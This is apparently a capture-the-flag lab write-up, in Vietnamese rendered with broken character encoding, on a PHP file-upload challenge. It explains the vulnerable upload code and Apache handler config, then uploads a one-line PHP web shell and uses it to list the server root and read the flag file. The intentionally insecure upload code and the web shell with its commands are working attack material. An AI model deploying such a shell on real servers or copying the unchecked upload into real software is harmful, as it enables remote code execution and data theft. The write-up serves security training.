# File Upload Level 1

## __1. S·ª≠ d·ª•ng ·ª©ng d·ª•ng nh∆∞ ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng__

![UI_image](1.PNG)
Khi m·ªõi ƒë·∫ßu m·ªü ·ª©ng d·ª•ng th√¨ s·∫Ω xu·∫•t hi·ªán giao di·ªán ƒë·ªÉ upload l√™n.  
V·∫≠y gi·ªù m√¨nh up load l√™n th·ª≠ 1 file b·∫•t k√¨.  
M√¨nh c√≥ file `test.txt` v·ªõi n·ªôi dung l√† `Hello`  
![text](2.PNG)

V·∫≠y m√¨nh ƒë√£ upload file th√†nh c√¥ng v√† ƒë·ªìng th·ªùi c≈©ng xu·∫•t hi·ªán 2 ƒë∆∞·ªùng link.
![](3.PNG)  
* _Link th·ª© 1_: Server tr·∫£ v·ªÅ n·ªôi dung c·ªßa file v·ª´a upload. ![](4.PNG)
* _Link th·ª© 2_: Server tr·∫£ v·ªÅ th∆∞ m·ª•c ch·ª©a t·∫•t c·∫£ file m√† ng∆∞·ªùi d√πng upload l√™n. ![](5.PNG)

## __2. Kh√°m ph√° b√™n sau ·ª©ng d·ª•ng__
__1. File `index.php`:__
```php
<?php
    // error_reporting(0);

    // Create folder for each user
    session_start();
    $dir = 'upload/' . session_id();
    if ( !file_exists($dir) )
        mkdir($dir);

    if(isset($_GET["debug"])) die(highlight_file(__FILE__));

    if(isset($_FILES["file"])) 
    {
        $error = '';
        $success = '';
        try {
            $file = $dir . "/" . $_FILES["file"]["name"];
            move_uploaded_file($_FILES["file"]["tmp_name"], $file);
            $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
            $success .= 'View all uploaded file at: <a href="/' . $dir . '">/' . $dir . ' </a>';
        } catch(Exception $e) {
            $error = $e->getMessage();
        }
    }
?>
```
C√°ch th·ª©c th·ª±c hi·ªán:
* _B∆∞·ªõc 1_: Server t·∫°o session ƒë·ªìng th·ªùi l·∫•y session ƒë√≥ c·ªông chu·ªói v·ªõi `upload/` t·∫°o ra th∆∞ m·ª•c upload cho t·ª´ng user.
* _B∆∞·ªõc 1.2_: N·∫øu get source qua tham s·ªë `debug` V√≠ d·ª• nh∆∞ `http://localhost:12001/?debug` th√¨ Server tr·∫£ source code v√† d·ª´ng ch∆∞∆°ng tr√¨nh qua h√†m `die()`.
* _B∆∞·ªõc 2_: N·∫øu c√≥ file upload l√™n th√¨ s·∫Ω th·ª±c hi·ªán c√°c b∆∞·ªõc:
    * T·∫°o file v·ªõi t√™n v√† n·ªôi dung c·ªßa file v·ª´a upload v√† l∆∞u v√†o th∆∞ m·ª•c c·ªßa ng∆∞·ªùi d√πng.
    * Bi·∫øn `$success` s·∫Ω l∆∞u 2 link file v√† th∆∞ m·ª•c, v√† bi·∫øn n√†y s·∫Ω tr·∫£ v·ªÅ ph·∫ßn giao di·ªán trong code html.
    * Bi·∫øn `$error` ch·ªâ ƒë·ªÉ l∆∞u l·ªói n·∫øu ch∆∞∆°ng tr√¨nh ch·∫°y l·ªói  

_X√°c ƒë·ªãnh v·ªã tr√≠ Untrusted Data:_
* `$_FILES`
* `$file` &rarr; `$_FILES`


__2. File `.htaccess`:__

N·∫±m trong th∆∞ m·ª•c upload s·∫Ω config cho Server list t·∫•t c√°c file trong th∆∞ m·ª•c `upload/<session c·ªßa user>`
```
Options +Indexes
```
__3. File `docker-php.conf`:__
```apache
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>

DirectoryIndex disabled
DirectoryIndex index.php index.html

<LocationMatch ^/upload/$>
    Order deny,allow
    Deny from all
</LocationMatch>
```
·ªû File config cho httpd th√¨ m√¨nh ch∆∞a hi·ªÉu r√µ l·∫Øm üò•. M√¨nh ch·ªâ hi·ªÉu ƒë∆∞·ª£c ·ªü tag `FileMatch` d√πng RegEx ƒë·ªÉ ki·ªÉm tra n·∫øu file ƒë∆∞·ª£c l·∫•y t·ª´ "_Document Root_" kh·ªõp v·ªõi ph·∫ßn RegEx c·ª• th·ªÉ l√† c√°c file c√≥ extension l√† _php_, _phar_, _phtml_ s·∫Ω th·ª±c thi h√†nh vi c·ªßa file PHP `application/x-httpd-php`.

V·∫≠y l√† ch√∫ng m√¨nh ƒë√£ ƒëi qua ph·∫ßn th·ª±c hi·ªán c·ªßa ch∆∞∆°ng tr√¨nh.

## __3. Khai th√°c__
N·∫øu nh∆∞ m√¨nh upload file PHP li·ªáu Server c√≥ th·ª±c thi file ƒë√≥ kh√¥ng nh·ªâ?ü§î
  
M√¨nh s·∫Ω t√¨m hi·ªÉu c√°c h√†nh vi m√† Server trong qu√° tr√¨nh HTTPd x·ª≠ l√Ω m·ªôt request:
![](7.PNG)
* Document Root: l√† ƒë∆∞·ªùng d·∫´n t·ªõi th∆∞ m·ª•c ch·ª©a t·∫•t c·∫£ t√†i nguy√™n c·ªßa trang web (home.html, index.php, images,...) 
* Khi user truy c·∫≠p v√†o home.html th√¨ HTTPd s·∫Ω v√†o Document Root ƒë·ªÉ t√¨m file ƒë√≥ v√† tr·∫£ n·ªôi dung v·ªÅ cho user.  

Qu√° tr√¨nh m·ªôt file PHP ƒë∆∞·ª£c x·ª≠ l√Ω:  
![](6.PNG)
* Khi c√≥ request ƒë·∫øn m·ªôt file php th√¨ Apache httpd s·∫Ω truy·ªÅn file ƒë√≥ cho module php x·ª≠ l√Ω. 
* Sau ƒë√≥ Apache m·ªõi tr·∫£ k·∫øt qu·∫£ th·ª±c thi v·ªÅ cho user.

√Ä! V·∫≠y m√¨nh c√≥ th·ªÉ Upload file PHP v√† khi request m·ªü file ƒë√≥ th√¨ HTTPd s·∫Ω g·ª≠i cho module th·ª±c thi v√† tr·∫£ k·∫øt qu·∫£ cho HTTPd r·ªìi g·ª≠i cho user.  

V·ªõi m·ª•c ƒë√≠ch l√† RCE server, v·∫≠y m√¨nh s·∫Ω upload 1 con shell PHP l√™n ƒë·ªÉ ƒëi·ªÅu khi·ªÉn to√†n b·ªô h·ªá th·ªëng

File `shell.php`
```php
<?php
	system($_GET["cmd"]); 
?>
```
V·ªõi con shell n√†y h·ªá th·ªëng s·∫Ω th·ª±c hi·ªán request v·ªõi GET method c√≥ tham s·ªë `cmd`

__Khai th√°c:__  
B·∫±ng c√°ch RCE Server t√¨m ra flag ƒë∆∞·ª£c gi·∫•u

List t·∫•t c·∫£ file/folder trong th∆∞ m·ª•c root  
![](8.PNG)

K·∫øt qu·∫£:
```
total 84
drwxr-xr-x   1 root root 4096 Jun  8 13:52 .
drwxr-xr-x   1 root root 4096 Jun  8 13:52 ..
-rwxr-xr-x   1 root root    0 Jun  8 13:52 .dockerenv
-rw-r--r--   1 root root   26 Jun  8 13:49 71c99ec9c94-secret.txt
drwxr-xr-x   1 root root 4096 Mar 17 18:51 bin
drwxr-xr-x   2 root root 4096 Dec 11  2021 boot
drwxr-xr-x   5 root root  340 Jun 18 11:36 dev
drwxr-xr-x   1 root root 4096 Jun  8 13:52 etc
drwxr-xr-x   2 root root 4096 Dec 11  2021 home
drwxr-xr-x   1 root root 4096 Mar 17 18:44 lib
drwxr-xr-x   2 root root 4096 Mar 16 00:00 lib64
drwxr-xr-x   2 root root 4096 Mar 16 00:00 media
drwxr-xr-x   2 root root 4096 Mar 16 00:00 mnt
drwxr-xr-x   2 root root 4096 Mar 16 00:00 opt
dr-xr-xr-x 273 root root    0 Jun 18 11:36 proc
drwx------   1 root root 4096 Mar 18 03:13 root
drwxr-xr-x   1 root root 4096 Mar 17 18:51 run
drwxr-xr-x   1 root root 4096 Mar 17 18:51 sbin
drwxr-xr-x   2 root root 4096 Mar 16 00:00 srv
dr-xr-xr-x  11 root root    0 Jun 18 11:36 sys
drwxrwxrwt   1 root root 4096 Jun 18 18:06 tmp
drwxr-xr-x   1 root root 4096 Mar 16 00:00 usr
drwxr-xr-x   1 root root 4096 Mar 17 18:44 var
```
C√≥ flag `71c99ec9c94-secret.txt` trong root. M·ªü file ƒë√≥ th√¥i n√†o.

M·ªü file flag `?cmd=cat /71c99ec9c94-secret.txt`
>CBJS{FAKE_FLAG_FAKE_FLAG}